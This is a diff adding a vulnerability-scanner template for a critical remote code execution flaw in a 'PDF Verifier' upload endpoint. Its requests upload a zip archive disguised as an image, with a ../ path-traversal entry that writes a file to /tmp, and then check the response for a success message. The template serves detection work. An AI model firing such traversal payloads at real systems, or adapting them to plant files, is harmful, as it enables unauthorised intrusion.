@@ -1,0 +1,48 @@
+id: pdfverifier-rce
+info:
+  name: PDF Verifier pdfverifier 接口 - 远程代码执行漏洞
+  author: Chaitin
+  severity: critical
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: pdfverifier
+    product: pdfverifier
+  tags: rce,vuln,pdfverifier
+variables:
+  r1: '{{to_lower(rand_text_alpha(16))}}'
+  p1: '{{zip("../../../../../../tmp/test",b"test\r\n")}}'
+flow: http(1) || http(2)
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/pdfverifier'
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{r1}}
+    body: |
+      ------WebKitFormBoundary{{r1}}
+      Content-Disposition: form-data; name="file"; filename="test.ofd"
+      Content-Type: image/jpeg
+
+      {{p1}}
+      ------WebKitFormBoundary{{r1}}--
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "statusCode") && contains(body, "\\u8BF7\\u6C42\\u6210\\u529F")'
+  - method: POST
+    path:
+      - '{{BaseURL}}/api/pdfverifier'
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{r1}}
+    body: |
+      ------WebKitFormBoundary{{r1}}
+      Content-Disposition: form-data; name="file"; filename="test.ofd"
+      Content-Type: image/jpeg
+
+      {{p1}}
+      ------WebKitFormBoundary{{r1}}--
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "statusCode") && contains(body, "\\u8BF7\\u6C42\\u6210\\u529F")'
